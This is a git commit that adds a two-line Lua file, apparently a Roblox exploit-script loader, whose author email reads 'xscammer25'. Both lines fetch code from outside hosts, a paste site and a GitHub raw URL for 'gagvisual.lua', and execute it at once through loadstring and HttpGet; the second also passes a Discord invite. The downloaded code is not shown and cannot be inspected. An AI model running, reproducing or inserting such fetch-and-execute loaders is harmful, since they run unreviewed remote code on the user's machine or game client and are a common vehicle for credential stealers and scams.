75b5e49fc2c0e9a061285e794ba381174bbe0993
terist999 <xscammer25@gmail.com>
2025-07-19 08:15:30 -0800

    Create projectscript.lua

---
+++ projectscript.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6ZctzXAXbq/0", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
